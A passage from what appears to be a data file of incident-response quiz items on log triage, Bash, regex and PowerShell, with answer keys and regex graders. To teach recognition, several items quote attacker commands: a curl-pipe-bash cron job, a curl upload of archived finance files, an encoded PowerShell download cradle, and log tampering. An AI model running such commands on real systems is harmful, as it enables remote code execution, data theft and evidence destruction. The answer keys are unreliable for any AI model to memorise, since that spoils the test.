hint:'Blocked noise never succeeded. Look for a successful login from an address that should never appear for that account \u2014 remember where deploy is allowed to come from.',
choices:[
 {t:'Accepted publickey for deploy from 203[.]0[.]113[.]88 (deploy never logs in from outside 10[.]0[.]20[.]5): freeze the account and inspect authorized_keys.',ok:true,fb:''},
 {t:'The brute force from 203[.]0[.]113[.]50 \u2014 reopen the rate-based block and keep watching that address closely.',ok:false,fb:'That campaign is already blocked and never succeeded. The auto-close was right about this one \u2014 the real entry is elsewhere.'},
 {t:'The sudo curl line \u2014 disable sudo for all users first, then investigate the downloaded script.',ok:false,fb:'The sudo line shows what happened after entry. Cutting all sudo is a broad change; the entry point is the deploy key login.'},
 {t:'The failed deploy password attempt from 198[.]51[.]100[.]23 \u2014 that failed password guess is the moment the attacker got in, so trace that address.',ok:false,fb:'That attempt failed. Four seconds later a different address logged in successfully with a key \u2014 that is the entry.'}],
expl:'The loud brute force from 203[.]0[.]113[.]50 never succeeded \u2014 it is noise. The quiet line that matters is "Accepted publickey for deploy" from an outside address, because deploy is a service account that must only be reached from the jump host. A service account with an interactive session running sudo and curl confirms hostile use. Freeze the account, capture its authorized_keys, and hunt for other logins from that key fingerprint.'},
{id:'h02',type:'terminal',theme:'Bash & Linux Analysis',title:'Sockets before the window closes',
scenario:'You have console access to the suspect host for a few minutes. The IR lead needs the full listening-socket picture with the owning process, saved to the evidence folder /tmp/ir_soc.txt. Nothing is installed for you \u2014 use whatever the standard toolset offers and make sure the output is written to that file.',
question:'Produce the listening TCP/UDP sockets with owning processes and save the output into /tmp/ir_soc.txt.',
hint:'Think which standard tool lists sockets, which flags keep only listeners with owning processes for both TCP and UDP, and how the output reaches the file.',
note:'Sandbox shell. Choose the tool and flags yourself; the file must receive the output.',
prompt:'root@app02:~#',
accept:[
 {re:'^\\s*sudo\\s+ss\\s+-(?=[a-z]*l)(?=[a-z]*p)(?=[a-z]*t)(?=[a-z]*u)[a-z]*\\s*(>\\s*\\/tmp\\/ir_soc\\.txt|>>\\s*\\/tmp\\/ir_soc\\.txt|\\|\\s*tee\\s+\\/tmp\\/ir_soc\\.txt)\\s*$',out:['Netid State  Recv-Q Send-Q Local Address:Port   Peer Address:Process','tcp   LISTEN 0      128    0[.]0[.]0[.]0:22       0[.]0[.]0[.]0:*    users:(("sshd",pid=912,fd=3))','tcp   LISTEN 0      511    0[.]0[.]0[.]0:80       0[.]0[.]0[.]0:*    users:(("nginx",pid=1180,fd=6))','tcp   LISTEN 0      4096   127[.]0[.]0[.]1:5432   0[.]0[.]0[.]0:*    users:(("postgres",pid=1400,fd=5))','tcp   LISTEN 0      1      0[.]0[.]0[.]0:4444     0[.]0[.]0[.]0:*    users:(("python3",pid=7741,fd=3))','udp   UNCONN 0      0      0[.]0[.]0[.]0:68       0[.]0[.]0[.]0:*']},
 {re:'^\\s*ss\\s+-(?=[a-z]*l)(?=[a-z]*p)(?=[a-z]*t)(?=[a-z]*u)[a-z]*\\s*(>\\s*\\/tmp\\/ir_soc\\.txt|>>\\s*\\/tmp\\/ir_soc\\.txt|\\|\\s*tee\\s+\\/tmp\\/ir_soc\\.txt)\\s*$',out:['Netid State  Recv-Q Send-Q Local Address:Port   Peer Address:Process','tcp   LISTEN 0      128    0[.]0[.]0[.]0:22       0[.]0[.]0[.]0:*    users:(("sshd",pid=912,fd=3))','tcp   LISTEN 0      511    0[.]0[.]0[.]0:80       0[.]0[.]0[.]0:*    users:(("nginx",pid=1180,fd=6))','tcp   LISTEN 0      4096   127[.]0[.]0[.]1:5432   0[.]0[.]0[.]0:*    users:(("postgres",pid=1400,fd=5))','tcp   LISTEN 0      1      0[.]0[.]0[.]0:4444     0[.]0[.]0[.]0:*    users:(("python3",pid=7741,fd=3))','udp   UNCONN 0      0      0[.]0[.]0[.]0:68       0[.]0[.]0[.]0:*']},
 {re:'^\\s*sudo\\s+netstat\\s+-(?=[a-z]*l)(?=[a-z]*p)(?=[a-z]*t)(?=[a-z]*u)[a-z]*\\s*(>\\s*\\/tmp\\/ir_soc\\.txt|>>\\s*\\/tmp\\/ir_soc\\.txt|\\|\\s*tee\\s+\\/tmp\\/ir_soc\\.txt)\\s*$',out:['Active Internet connections (only servers)','Proto Recv-Q Send-Q Local Address     Foreign Address   State    PID/Program name','tcp   0  0 0[.]0[.]0[.]0:22   0[.]0[.]0[.]0:*   LISTEN   912/sshd','tcp   0  0 0[.]0[.]0[.]0:80   0[.]0[.]0[.]0:*   LISTEN   1180/nginx','tcp   0  0 127[.]0[.]0[.]1:5432 0[.]0[.]0[.]0:*  LISTEN   1400/postgres','tcp   0  0 0[.]0[.]0[.]0:4444 0[.]0[.]0[.]0:*   LISTEN   7741/python3']},
 {re:'^\\s*netstat\\s+-(?=[a-z]*l)(?=[a-z]*p)(?=[a-z]*t)(?=[a-z]*u)[a-z]*\\s*(>\\s*\\/tmp\\/ir_soc\\.txt|>>\\s*\\/tmp\\/ir_soc\\.txt|\\|\\s*tee\\s+\\/tmp\\/ir_soc\\.txt)\\s*$',out:['Active Internet connections (only servers)','Proto Recv-Q Send-Q Local Address     Foreign Address   State    PID/Program name','tcp   0  0 0[.]0[.]0[.]0:22   0[.]0[.]0[.]0:*   LISTEN   912/sshd','tcp   0  0 0[.]0[.]0[.]0:80   0[.]0[.]0[.]0:*   LISTEN   1180/nginx','tcp   0  0 127[.]0[.]0[.]1:5432 0[.]0[.]0[.]0:*  LISTEN   1400/postgres','tcp   0  0 0[.]0[.]0[.]0:4444 0[.]0[.]0[.]0:*   LISTEN   7741/python3']}],
canon:'sudo ss -tulnp > /tmp/ir_soc.txt  (netstat -tulnp is equally correct)',
tip:'You need three things from the flags: listening sockets (l), the owning process (p) and both TCP and UDP (t and u). Then point the output at the file with > (or pipe through tee).',
expl:'Either ss or netstat answers the goal; the flags decide the value. l keeps only listening sockets, p adds the owning process, t and u cover TCP and UDP, and n avoids slow name lookups. The redirect > /tmp/ir_soc.txt (or a tee) preserves the picture for the evidence folder. Note the preview: a python3 process listening on 0[.]0[.]0[.]0:4444 next to the normal sshd, nginx and postgres \u2014 exactly the kind of find this capture exists for.'},
{id:'h03',type:'spot',theme:'Shell Scripting Basics',title:'The triage script that fights back',
scenario:'A teammate shared their "quick IR pack" to run on the compromised host app02. Read it as an evidence handler would: some lines collect data, but two lines damage evidence or its integrity.',
question:'Click every line that damages evidence or its integrity.',
hint:'Ask of each line: does it only read and copy, or does it write into, over, or on top of something that matters?',
lines:[
 {t:'#!/bin/bash'},
 {t:'grab() { cp "$1" /tmp/ir/ 2>/dev/null; }'},
 {t:'ps aux > /tmp/ir/proc.txt'},
 {t:"sed -i 's/Failed password/FAILED PW/g' /var/log/auth.log",bad:true,why:'sed -i edits the original log in place \u2014 the artefact is altered and its hash changes. Copy first, edit only the copy, never the original.'},
 {t:'grab /var/log/auth.log'},
 {t:'for f in /etc/cron.d/*; do grab "$f"; done'},
 {t:'chmod 777 /tmp/ir/proc.txt',bad:true,why:'World-writable evidence can be modified by anyone on the host; integrity is gone. Keep evidence owner-read-only (640 or 600).'},
 {t:'ss -tunlp > /tmp/ir/sockets.txt'},
 {t:'sha256sum /tmp/ir/* > /tmp/ir/hashes.txt'}],
tip:'Live-collection rule: read-only commands on the host, copies into your evidence folder, hashes immediately, and never an -i (in-place) edit on an original.',
expl:'The sed -i line rewrites the original auth.log \u2014 after it, the log on disk no longer matches what the system wrote, and any court or reviewer can see the file was changed. chmod 777 makes the collected process list writable by every account on a compromised machine. The rest follows the right pattern: the shebang names the interpreter, the grab function quotes its argument ("$1"), copies it into /tmp/ir and buries stderr (stream 2) in /dev/null so stdin is never touched, the loop walks every cron file, and only copies land in /tmp/ir before hashing \u2014 read and copy, never write.'},
{id:'h04',type:'dragdrop',theme:'Analysis Methods',title:'Sort the one-liners by impact',
scenario:'Six one-liners were found across shell histories on two hosts. Before the evening report, sort them by what they actually do to a system.',
question:'Drag each one-liner into the bin that describes it.',
hint:'Reading leaves no trace on data. Adding an account or killing a process changes the system. Rewriting logs or wiping history is tampering.',
items:[
 {t:'grep -c 4625 security-export.log',bin:0,fb:'Counts failed logons in a copy of the log \u2014 pure read-only analysis.'},
 {t:'last -F',bin:0,fb:'Reads the wtmp session history \u2014 read-only.'},
 {t:'useradd svc_backup2',bin:1,fb:'Creates a new account on the host \u2014 a real system change (and a classic persistence move).'},
 {t:'kill -9 4410',bin:1,fb:'Force-kills a process \u2014 the live state changes and the process is gone for analysis.'},
 {t:"sed -i 's/2026/2025/g' /var/log/syslog",bin:2,fb:'Rewrites timestamps inside the live syslog \u2014 textbook log tampering.'},
 {t:'history -c && history -w',bin:2,fb:'Clears the in-memory history and writes the emptied list to disk \u2014 destroying an audit trail.'}],
bins:['Read-only collection or analysis','Changes the system state','Tampering with logs or history'],
expl:'Read-only tools (grep on a log copy, last) answer questions without touching the host. useradd and kill change the machine \u2014 they need approval and documentation, and an unexplained new account is itself an incident. sed -i on a live log and history -c erase or rewrite the record of what happened \u2014 when you find these in an attacker\u2019s footprint, they are anti-forensics; when you do them yourself, you are destroying your own case.'},
{id:'h05',type:'multi',theme:'Analysis Methods',title:'Three steps toward data theft',
scenario:'An EDR log shows a bash script that ran on the finance file server. Select every line from the script that stages, packs or ships the collected data out \u2014 the data-theft steps.',

question:'Select the 3 data-theft steps.',
hint:'Think pack, encode, upload. Two of the five lines are ordinary read-only commands.',
choices:[
 {t:'tar czf /tmp/.docs.tgz /home/finance',ok:true,fb:''},
 {t:'curl -T /tmp/.docs.tgz hxxp://203[.]0[.]113[.]120/up',ok:true,fb:''},
 {t:'base64 /tmp/.docs.tgz > /tmp/.b64',ok:true,fb:''},
 {t:'df -h /home && free -m && uptime && date',ok:false,fb:'df only reports free disk space. It reads nothing sensitive and prepares nothing.'},
 {t:'last -F | head -20 && date',ok:false,fb:'last lists past sessions \u2014 useful triage, but not staging.'}],
expl:'The prepare-to-leave work has three steps: tar packs the finance tree into one hidden archive, base64 re-encodes it (often to slip through filters), and curl -T uploads the result to an outside address. The dot-files in /tmp hide the trail from casual ls. df, free, uptime, last and date are normal, read-only commands \u2014 noise here, but they show the script mixed real theft steps with harmless-looking calls.'},
{id:'h06',type:'fill',theme:'Bash & Linux Analysis',title:'Rebuild the top-talker pipeline',
scenario:'Your detection note for the web servers includes the classic "top client addresses" pipeline, but the PDF export ate three pieces of it. The result must list the five client addresses that appear most often in access.log.',
question:'Complete the three missing pieces.',
hint:'Inside awk, the first field is $1. To get "biggest first", sort numerically and reverse. The last piece limits the list to five lines.',
text:"awk '{print {{0}}}' access.log | sort | uniq -c | {{1}} | {{2}} -n 5",
slots:['$1','sort -rn','head'],
bank:['$1','sort -rn','head','$0','$3','sort -r','tail','wc'],
expl:'$1 is the first whitespace-separated field of each access-log line \u2014 the client address. sort | uniq -c counts repeats, but uniq only folds neighbours, which is why sort comes first. sort -rn then orders by the count, numerically, biggest first; plain sort -r would sort by the whole line as text. head -n 5 keeps the top five. tail would show the quietest clients instead.'},
{id:'h07',type:'order',theme:'Analysis Methods',title:'Volatile first \u2014 the collection order',
scenario:'app02 is confirmed compromised but still running. You have one shot at collection before the business forces a rebuild. Order the six steps of a defensible collection.',
question:'Put the six collection steps in the correct order.',
hint:'Collect what dies first (memory, sockets), then what is on disk, then prove integrity, and only rebuild when everything is safe.',
items:['Snapshot processes and sockets (ps aux, ss -tunlp) from the live host','Capture a memory image while the host is still running','Copy fresh logs, crontabs and startup scripts to the evidence share','Hash every collected file and record the hashes in the ticket','Take disk images for offline analysis','Rebuild or reimage the host from trusted media'],
expl:'The order follows volatility: running processes, sockets and RAM vanish at shutdown, so they are first. Disk data (logs, cron files, images) survives, so it follows \u2014 scp it to the evidence share so it lives outside the host. Hashes must come right after each item exists \u2014 they prove nothing changed later. Reimaging is destruction of the crime scene and always comes last, after every artefact is secured and documented in the ticket. Skipping memory for disk-only evidence is the most common and most expensive mistake.'},
{id:'h08',type:'branch',theme:'Bash & Linux Analysis',title:'Root crontab surprise on app02',
scenario:'In root\u2019s crontab on app02 you find:\n\n*/10 * * * * /bin/bash -c "curl -s hxxp://203[.]0[.]113[.]77/c.txt | bash" # backup-check\n\nNo change ticket mentions it. Your decisions shape the response.',
question:'Choose the best action at each of the three decision points.',
hint:'Evidence first, scope second, cleanup last. Deleting the line feels efficient and loses the trail.',
parts:[
 {label:'Step 1 \u2014 the line is live and running every 10 minutes. First move?',choices:[
  {t:'Preserve the crontab and the payload URL as evidence \u2014 screenshot and copy \u2014 before touching anything.',ok:true,res:'The job text, its schedule and the URL are saved \u2014 you can analyse calmly now.',fb:''},
  {t:'Delete the cron line immediately so the beacon stops firing within the next ten minutes.',ok:false,res:'The beacon stops, but the only copy of the job text is in your memory \u2014 weak evidence.',fb:'Deletion is cleanup. Cleanup before preservation destroys the artefact you need to analyse and report.'},
  {t:'Reboot app02 immediately so that the cron daemon reloads a clean schedule.',ok:false,res:'Cron reloads from the same crontab after reboot \u2014 the job returns, and you lost volatile state.',fb:'Rebooting does not remove persistence; it just kills your chance to collect memory.'},
  {t:'Wait for the next scheduled run and quietly watch it live for a full hour first.',ok:false,res:'It beacons 6 more times while you watch \u2014 and possibly fetches new instructions.',fb:'Letting attacker code execute on schedule while you observe is the attacker\u2019s plan, not yours.'}]},
 {label:'Step 2 \u2014 evidence is preserved. What does scope look like?',choices:[
  {t:'Check every cron location (user crontabs, /etc/cron.d, spool, timers) and fetch the payload into a sandbox.',ok:true,res:'You find the same URL in /etc/cron.d/.sys-sync on a second host \u2014 the scope just grew.',fb:''},
  {t:'Assume this is the only instance anywhere \u2014 one crontab line on one host only.',ok:false,res:'The same line exists in /etc/cron.d/.sys-sync on web03, discovered three days later.',fb:'Attackers persist in several places at once. Assume more until you have looked everywhere.'},
  {t:'Only read the payload in production, straight from the live root shell on app02.',ok:false,res:'The payload detects the production environment and exits silently \u2014 you learned nothing.',fb:'Uncontrolled execution of attacker code in production can trigger the second stage. Sandboxes exist for this.'},
  {t:'Skip the payload entirely \u2014 the URL alone is already evidence enough for the incident report.',ok:false,res:'The report cannot say what the job did, and the business asks the exact question you cannot answer.',fb:'Knowing what ran decides containment scope: credential theft? ransomware staging? You must look \u2014 safely.'}]},
 {label:'Step 3 \u2014 scope is known: two hosts, same job. Close it out.',choices:[
  {t:'Remove the jobs, block the address, rotate root and service credentials, then hunt fleet-wide.',ok:true,res:'Persistence removed, C2 cut, stolen credentials useless, and the fleet-wide hunt finds one more copy on a test box.',fb:''},
  {t:'Remove the two cron lines on both hosts and then simply stop there.',ok:false,res:'Two days later the same payload lands through a saved SSH key that still works.',fb:'The cron line was one leg of the intrusion. Keys and credentials remain unless rotated.'},
  {t:'Block the address at the perimeter only and keep the cron jobs running for monitoring.',ok:false,res:'The job fails silently and switches to a backup domain you have not seen.',fb:'Leaving persistence in place is monitoring the attacker\u2019s patience, not their absence.'},
  {t:'Rotate the root password on app02 and leave every other account alone.',ok:false,res:'web03 keeps beaconing \u2014 its credentials were not touched.',fb:'Partial cleanup across a two-host intrusion leaves the second host fully compromised.'}]}],
expl:'A curl-pipe-bash cron job owned by root is persistence with remote code execution on a timer. The professional order: preserve (copy the job and URL), scope (all cron locations and the payload itself, in a sandbox), remediate (remove everywhere, block, rotate credentials), then hunt for the same indicators elsewhere. Every shortcut \u2014 deleting early, running payloads live, partial cleanup \u2014 has cost real teams days.'},
{id:'h09',type:'logview',theme:'Regular Expressions',title:'Anchor discipline',
scenario:'Your teammate built a detection grep -E "^2026-03-1[45]T0[34]:" for early-hours events in the ISO-style export. Before it ships, they ask you to predict exactly which lines it will catch.',
log:{file:'auth-export.log \u2014 ISO timestamps',lines:[
 {t:'2026-03-15T03:41:02Z sshd[2210]: Failed password for invalid user admin from 203[.]0[.]113[.]50 port 33031',k:'bad'},
 {t:'2026-03-16T03:41:02Z sshd[2211]: Failed password for invalid user oracle from 203[.]0[.]113[.]50 port 33055',k:'mut'},
 {t:'2026-03-15T09:41:02Z systemd[1]: Started Daily apt upgrade timer.',k:'mut'},
 {t:'2026-03-14T04:12:55Z sshd[2290]: Accepted publickey for kchen from 10[.]0[.]4[.]22 port 33011',k:'good'},
 {t:'  2026-03-15T03:59:59Z sshd[2311]: Failed password for deploy from 198[.]51[.]100[.]23 port 55008',k:'bad'},
 {t:'2026-03-15T0341:02Z cron[441]: (root) CMD (/usr/bin/local-backup)',k:'mut'},
 {t:'2026-03-14T03:07:44Z sshd[2260]: Accepted password for alopez from 10[.]0[.]4[.]15 port 51240',k:'good'}]},
question:'Which line matches the pattern ^2026-03-1[45]T0[34]:?',
hint:'The ^ anchor, the character class on the day, the class on the hour, and the literal colon after it \u2014 check all four on every line.',
choices:[
 {t:'2026-03-15T03:41:02Z \u2026 \u2014 day 15, hour 03, colon present.',ok:true,fb:''},
 {t:'2026-03-16T03:41:02Z \u2026 \u2014 but day 16 is outside the class.',ok:false,fb:'The class [45] allows only 14 or 15 after "2026-03-1". Day 16 fails.'},
 {t:'  2026-03-15T03:59:59Z \u2026 \u2014 the leading spaces break the anchor.',ok:false,fb:'The ^ anchor demands the pattern at the very start. Leading spaces break the match \u2014 a classic reason detections miss lines.'},
 {t:'2026-03-15T0341:02Z \u2026 \u2014 the colon after the hour is missing.',ok:false,fb:'After the hour the pattern needs the literal colon (0[34]:). This line has no colon there.'}],
expl:'The anchor ^ pins the match to the first character of the line, so even one leading space kills it. [45] matches exactly one character from the set, so day 16 fails. 0[34]: needs the hour 03 or 04 followed by a real colon \u2014 and to match a literal dot instead of "any character", you would escape it as \\. A negated class like [^0-9] inverts the idea and matches anything EXCEPT its members. Anchors plus tight character classes are what make a detection precise \u2014 loosen either one and the rule either misses lines or fires on everything.'},
{id:'h10',type:'fill',theme:'Regular Expressions',title:'Capture the name, not the line',
scenario:'Your sed one-liner should turn every brute-force line into just the user name, so the next stage can count attempts per account. It relies on a capture group and a backreference.',
question:'Complete the three missing pieces.',
hint:'The backreference \\2 re-prints whatever the second parentheses captured. The parentheses construct is called a capture group; the target here is the user name.',
text:"sed -E 's/Failed password for (invalid user )?([A-Za-z0-9_]+).*/\\2/' auth.log\nprints just the {{0}} name from each line, because \\2 is a {{1}} that refers to the second {{2}}",
slots:['user','backreference','capture group'],
bank:['user','backreference','capture group','password','forward reference','pipe','comment'],
expl:'Parentheses in a regex capture whatever matched inside them; here group 2 is the account name. \\2 is a backreference \u2014 it re-prints the second group\u2019s content as the replacement text. Group 1 (the optional "invalid user") is captured only to skip it. Forward references do not exist in this direction, and this trick has nothing to do with pipes or comments \u2014 it is pure regex capture-and-reuse. Like grep -E, sed -E speaks the ERE dialect; the fuller engine, PCRE, adds even more \u2014 but capture groups and backreferences work in both.'},
{id:'h11',type:'scenario',theme:'PowerShell',title:'The hidden encoded command',
scenario:'Windows PowerShell/Operational log, event 4104, on WKS-204:\n\npowershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...)\n\ndecoded: IEX (New-Object Net.WebClient).DownloadString("hxxp://203[.]0[.]113[.]31/ps/scan.ps1")\n\nThe user swears they opened only a spreadsheet. Answer once as blue team, once as red team.',
question:'Two points of view on the same artefact.',
hint:'-enc is base64 on the command line; -w hidden hides the window; IEX plus WebClient is a download cradle. From the attacker\u2019s chair: what would re-running it leave behind?',
parts:[
 {label:'Blue team \u2014 what is this command?',choices:[
  {t:'A hidden, encoded download cradle \u2014 fileless execution that pulls a script into memory.',ok:true,fb:''},
  {t:'A signed Microsoft update pipeline \u2014 encoded commands are how Windows ships updates.',ok:false,fb:'Windows Update does not need hidden encoded IEX cradles. That combination is attacker tradecraft.'},
  {t:'A corrupted transcript file \u2014 the base64 is a damaged log entry.',ok:false,fb:'The base64 is part of the -enc switch on the command line, not log corruption.'},
  {t:'A user\u2019s saved PowerShell alias \u2014 aliases look like this when exported.',ok:false,fb:'Aliases are short names like %, not encoded blobs with network calls inside.'}]},
 {label:'Red team \u2014 you must re-run the cradle to test detection. What will the blue team see?',choices:[
  {t:'Script block logging records the decoded command as event 4104; the proxy logs the C2 request.',ok:true,fb:''},
  {t:'Nothing at all \u2014 encoded commands are invisible to every log source on Windows.',ok:false,fb:'Encoding hides the command from the console, not from script block logging, which records the decoded form.'},
  {t:'Only a 200 OK in the web server log and nothing at all on the client side.',ok:false,fb:'The client-side execution is exactly what event 4104 captures, decoded and all.'},
  {t:'An antivirus quarantine alert on every single encoded command the host ever ran.',ok:false,fb:'AV does not blanket-quarantine encoded commands; the reliable detection here is script block logging plus proxy telemetry.'}]}],
expl:'Blue view: -nop -w hidden -enc plus IEX/DownloadString is the standard fileless pattern \u2014 no file lands on disk, the payload runs from memory, which is why the PowerShell event log matters. Red view: the same trick that hides the window does not hide the decoded text \u2014 script block logging (4104) and the proxy both see it, and any remoting use (WinRM) would show in the same logs. Defenders win this duel by keeping module and script block logging on.'}
,
{id:'h12',type:'scenario',theme:'PowerShell',title:'The quiet export on FS-02',
scenario:'You find this running in mlee\u2019s session on the file server FS-02 (no change ticket matches):\n\nGet-ChildItem \\\\FS-02\\Finance -Recurse -Include *.xlsx,*.csv |\n  Select-String -Pattern "salary|IBAN|SSN" -List |\n  Export-Csv C:\\Windows\\Temp\\findings.csv -NoTypeInformation\n(Get-Content C:\\Windows\\Temp\\findings.csv | Measure-Object -Line).Lines',
question:'Classify the script, then choose the response.',
hint:'Ask what the output file is for, who runs it, and where it lives. Then pick the response that keeps both the evidence and the business safe.',
parts:[
 {label:'Part 1 \u2014 what is this script doing?',choices:[
  {t:'Targeted data discovery \u2014 it maps where sensitive records live and writes an index ready for exfiltration.',ok:true,fb:''},
  {t:'A DLP compliance scan installed by IT \u2014 the -List switch proves it is an official tool.',ok:false,fb:'Official scans run under service accounts with tickets. This one runs in a user session and writes to Temp.'},
  {t:'A broken backup job \u2014 backups do not search for the word "salary".',ok:false,fb:'Searching for salary, IBAN and SSN is content targeting, not backup behaviour.'},
  {t:'A harmless read-only search \u2014 nothing left the server yet.',ok:false,fb:'Nothing left yet, true \u2014 but the index of sensitive files is exactly what an exfiltration step needs next.'}]},
 {label:'Part 2 \u2014 mlee\u2019s session is still open. Best response?',choices:[
  {t:'Preserve the script text, findings.csv and process details, then involve IR before changing anything.',ok:true,fb:''},
  {t:'Delete findings.csv and kill the PowerShell process \u2014 quick, clean, problem solved.',ok:false,fb:'That destroys the best evidence of intent and scope, and mlee\u2019s handler simply reruns it.'},
  {t:'Rename the Finance share right away so that the running scan fails.',ok:false,fb:'It alerts the actor, breaks every business process on the share, and the actor re-points the path in seconds.'},
  {t:'Wait an hour to see how large findings.csv grows before you take any action.',ok:false,fb:'Waiting gives the actor exactly the window they planned for. Preserve first, act fast.'}]}],
expl:'The script is reconnaissance for theft: it walks the Finance share, finds files containing high-value markers (salary, IBAN, SSN), and writes a tidy index to Temp. Export-Csv keeps that index spreadsheet-ready, and ConvertTo-Json would make it machine-readable \u2014 the next line of the story is usually an upload of exactly such a file. The right move preserves everything (script, output, process tree) and brings IR in \u2014 deletions, renames or delays all help the actor more than the investigation.'},
{id:'h13',type:'match',theme:'Bash & Linux Analysis',title:'Read the room: six lines, six meanings',
scenario:'Before you write the incident summary, you must label six lines pulled from different artefacts on app02. Your lead will use your labels to decide the story of the intrusion.',
question:'Match each line with its correct interpretation.',
hint:'Ask of each line: routine, or a step an attacker needs? New accounts, immutable cron files, decoded execution \u2014 those are rarely routine.',
items:[
 {t:'CRON[2201]: (root) CMD (/usr/bin/local-backup)',bin:0,fb:'A known maintenance script on its normal schedule \u2014 routine.'},
 {t:'sshd[3310]: Accepted publickey for deploy from 203[.]0[.]113[.]88',bin:1,fb:'A service account logging in from an outside address \u2014 that account must only be reached from the jump host.'},
 {t:'useradd[4412]: new user: name=svc_backup2, uid=1007',bin:2,fb:'A brand-new local account \u2014 the classic persistence step; verify who created it and why.'},
 {t:'chattr +i /etc/cron.d/backup-sync',bin:3,fb:'Setting the immutable flag on a cron file \u2014 protects persistence from being edited or removed.'},
 {t:'echo Y3VybCAg... | base64 -d | bash',bin:4,fb:'Decoding a blob straight into bash \u2014 hidden command execution that hides its text from casual readers.'},
 {t:'sudo: mlee : COMMAND=/usr/sbin/reboot',bin:5,fb:'A privileged reboot run with sudo \u2014 verify it against the change calendar before judging.'}],
bins:['Routine scheduled activity','Login from an unusual source','New account created (possible persistence)','Persistence made tamper-proof','Hidden command execution via decoding','Privileged action \u2014 verify against change records'],
expl:'Six lines, six different verdicts \u2014 this is the daily bread of log triage. The cron backup and a sudo reboot are normal if the change calendar agrees. A service account from an outside address, a fresh account, an immutable flag on a cron file and base64-pipe-bash are all steps in the same intrusion playbook: get in, persist, hide. Labelling each line correctly is what turns raw logs into a timeline.'},
{id:'h14',type:'qcm',theme:'Bash & Linux Analysis',title:'Count lines or count hits?',
scenario:'The log line below appears once in auth.log:\n\nMar 15 03:14:02 bastion02 sshd[912]: Failed password for invalid user admin from 203[.]0[.]113[.]7 port 40091 Failed password for invalid user admin2 from 203[.]0[.]113[.]7 port 40092\n\n(yes \u2014 two failed attempts got mangled into one line by a broken collector).',
question:'You run: grep -c "Failed password" auth.log. What do you get?',
hint:'-c counts lines, not matches \u2014 and both attempts sit on one physical line.',
choices:[
 {t:'1 \u2014 -c counts matching lines, and the two attempts share one physical line.',ok:true,fb:''},
 {t:'2 \u2014 grep -c counts how many separate times the pattern occurs in the file.',ok:false,fb:'That is what grep -o piped into wc -l would give. The -c flag counts lines, not occurrences.'},
 {t:'0 \u2014 the pattern has a capital F, so no lowercase copy can ever match.',ok:false,fb:'The pattern matches exactly as written: "Failed password" appears twice on that line.'},
 {t:'22 \u2014 grep also prints the port numbers and the counts it found.',ok:false,fb:'grep never extracts port numbers; -c prints a single count per file.'}],
expl:'grep -c answers "how many lines matched", not "how many matches". With two attempts mangled onto one line, -c says 1 while the true attempt count is 2. When the difference matters (rates, per-attempt stats), use grep -o "pattern" | wc -l, which prints every occurrence on its own line. Collector bugs that merge lines are exactly why these two counts diverge in real SOC data.'},
{id:'h15',type:'rank',theme:'Analysis Methods',title:'Rank the must-gather findings',
scenario:'Your must-gather script on app02 returned five findings. The incident commander asks for them ranked most-urgent first so response starts at the top.',
question:'Rank the five findings from most urgent (top) to least urgent (bottom).',
hint:'Active remote control beats everything. Then think: privileged access added, then persistence that heals itself, then a risky config change, then something cosmetic.',
items:['python3 (pid 7741) listening on 0[.]0[.]0[.]0:4444 \u2014 reverse-shell pattern','New account sysdiag with uid=0 in /etc/passwd','/etc/cron.d/.sys-sync recreates itself two minutes after deletion','sshd config changed: PermitRootLogin yes','System clock drifts 4 minutes from the NTP source'],
expl:'A listening reverse shell is live attacker access \u2014 response starts there. A uid=0 account is full privileged access granted whenever the attacker wants it. The self-restoring cron job means something (a watcher process) is still alive and re-planting \u2014 you have not found the whole implant. PermitRootLogin yes widens the door but needs a successful login to matter. Clock drift only weakens log correlation \u2014 annoying, not hostile by itself.'},
{id:'h16',type:'spot',theme:'PowerShell',title:'IR pack for Windows \u2014 two killers inside',
scenario:'The Windows triage script below promises a quick evidence pack. Two of its lines ruin the evidence \u2014 one destroys the live process, one deletes the results.',
question:'Click every line that damages evidence or the investigation.',
hint:'Look for what stops a running process and what removes the files that were just written.',
lines:[
 {t:'# IR pack v2 \u2014 Windows'},
 {t:'Get-EventLog Security -Newest 500 | Out-File C:\\Temp\\sec.txt'},
 {t:'Get-Process | Out-File C:\\Temp\\proc.txt'},
 {t:'Stop-Process -Id 4120 -Force',bad:true,why:'Kills the suspect process before its details, memory or connections are captured \u2014 volatile evidence gone.'},
 {t:'Get-Content C:\\Temp\\proc.txt | Measure-Object -Line'},
 {t:'Remove-Item C:\\Temp\\*.txt -Force',bad:true,why:'Deletes the evidence files the script itself just wrote \u2014 the report ends up with nothing to attach.'},
 {t:'Get-Date | Out-File C:\\Temp\\stamp.txt -Append'}],
tip:'On Windows as on Linux: capture first, then act on processes, and never wildcard-delete inside your own evidence folder. A read-only service review (Get-Service) or the newer Get-WinEvent reader would both have been safe here.',
expl:'Stop-Process on the suspect PID destroys the live artefact \u2014 you lose its memory contents, its open handles and its network state, the exact things IR needs. Remove-Item C:\\Temp\\*.txt wipes the process list and event export the script just produced. The remaining lines are safe collection and note-keeping. The same discipline applies in every OS: observe, record, hash \u2014 act only after the picture is saved.'},
{id:'h17',type:'multi',theme:'Analysis Methods',title:'Approved: read-only only',
scenario:'The change board allows live triage on FS-02 under one rule: nothing that modifies the system, its files or its running state. Select every command that is safe under that rule.',
question:'Select the 4 read-only commands.',
hint:'Read the verb: stat, sum, list, show \u2014 anything that sets, kills or writes fails the rule.',
choices:[
 {t:'stat /usr/bin/curl',ok:true,fb:''},
 {t:'sha256sum /var/log/auth.log',ok:true,fb:''},
 {t:'lsof -p 7741',ok:true,fb:''},
 {t:'ps aux',ok:true,fb:''},
 {t:'chmod 640 /var/log/auth.log',ok:false,fb:'chmod changes file metadata \u2014 a modification, and on a log file it changes the evidence itself.'},
 {t:'pkill -f python3',ok:false,fb:'pkill kills processes \u2014 the opposite of read-only, and it destroys volatile evidence.'},
 {t:"sed -i 's/x/y/' /etc/hosts",ok:false,fb:'sed -i rewrites a system file in place \u2014 a direct modification.'}],
expl:'stat (metadata), sha256sum (hashing), lsof (open files of a PID) and ps (process list) only observe. chmod rewrites permissions, pkill ends processes, and sed -i edits a file in place \u2014 all three modify the system, and modifications during live triage either destroy evidence or destroy the claim that you changed nothing. When in doubt, read the verb: anything that sets, kills or writes does not pass the board.'},
{id:'h18',type:'fill',theme:'PowerShell',title:'Context around every 4625',
scenario:'Your detection note for Windows triage says: show each failed-logon event with two lines of context before and after, from the exported security log. The exported file is plain text, so Select-String is the tool.',
question:'Complete the two missing parameter names.',
